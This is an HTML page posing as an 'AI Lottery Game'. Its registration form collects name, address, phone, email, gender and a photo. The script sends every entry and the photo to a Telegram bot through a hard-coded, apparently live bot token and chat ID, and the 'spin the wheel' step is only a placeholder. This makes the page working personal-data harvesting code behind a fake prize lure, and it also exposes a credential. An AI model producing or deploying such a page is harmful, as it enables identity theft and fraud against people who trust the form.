<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Lottery Game</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            margin: 0;
            padding: 0;
            text-align: center;
        }

        .container {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            margin: 20px auto;
            padding: 20px;
            width: 90%;
            max-width: 400px;
        }

        h1, h2 {
            color: #4CAF50;
        }

        input, select, button {
            width: 100%;
            margin: 10px 0;
            padding: 10px;
            font-size: 16px;
        }

        input[type="file"] {
            padding: 5px;
        }

        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
            font-weight: bold;
            border-radius: 5px;
        }

        button:hover {
            background-color: #45a049;
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>

<!-- Registration Page -->
<div class="container" id="registrationPage">
    <h1>Register for AI Lottery</h1>
    <form id="registrationForm" enctype="multipart/form-data">
        <input type="text" id="firstName" placeholder="First Name" required>
        <input type="text" id="lastName" placeholder="Last Name" required>
        <input type="text" id="address" placeholder="Address" required>
        <input type="tel" id="phone" placeholder="Phone Number" required>
        <input type="email" id="email" placeholder="Email Address" required>
        <label>Upload Picture:</label>
        <input type="file" id="picture" accept="image/*" required>
        <select id="gender" required>
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
        </select>
        <button type="submit">Submit & Play</button>
    </form>
</div>

<!-- Spinning Wheel Page -->
<div class="container hidden" id="spinningPage">
    <h2>Spin the Wheel</h2>
    <p>Click the button below to spin!</p>
    <button id="spinButton">Spin Now</button>
</div>

<script>
    const registrationForm = document.getElementById('registrationForm');
    const registrationPage = document.getElementById('registrationPage');
    const spinningPage = document.getElementById('spinningPage');
    const spinButton = document.getElementById('spinButton');

    const TELEGRAM_BOT_TOKEN = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY"; // Replace with your bot token
    const CHAT_ID = "874563737"; // Replace with your chat ID

    registrationForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Collect form data
        const firstName = document.getElementById('firstName').value;
        const lastName = document.getElementById('lastName').value;
        const address = document.getElementById('address').value;
        const phone = document.getElementById('phone').value;
        const email = document.getElementById('email').value;
        const gender = document.getElementById('gender').value;
        const picture = document.getElementById('picture').files[0];

        // Prepare message
        const message = `
📋 *New Lottery Registration* 📋
👤 *Name:* ${firstName} ${lastName}
🏠 *Address:* ${address}
📞 *Phone:* ${phone}
✉️ *Email:* ${email}
🧑 *Gender:* ${gender}
        `;

        // Send message to Telegram
        await sendMessageToTelegram(message);

        // Send uploaded picture
        if (picture) {
            await sendPictureToTelegram(picture);
        }

        // Move to the spinning page
        registrationPage.classList.add('hidden');
        spinningPage.classList.remove('hidden');
    });

    async function sendMessageToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: "Markdown"
        };

        try {
            await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
            });
        } catch (error) {
            console.error("Error sending message to Telegram:", error);
        }
    }

    async function sendPictureToTelegram(file) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", file);

        try {
            await fetch(url, {
                method: "POST",
                body: formData,
            });
        } catch (error) {
            console.error("Error sending picture to Telegram:", error);
        }
    }

    // Placeholder spinning logic
    spinButton.addEventListener('click', () => {
        alert("Spin logic will be implemented here!");
    });
</script>
</body>
</html>
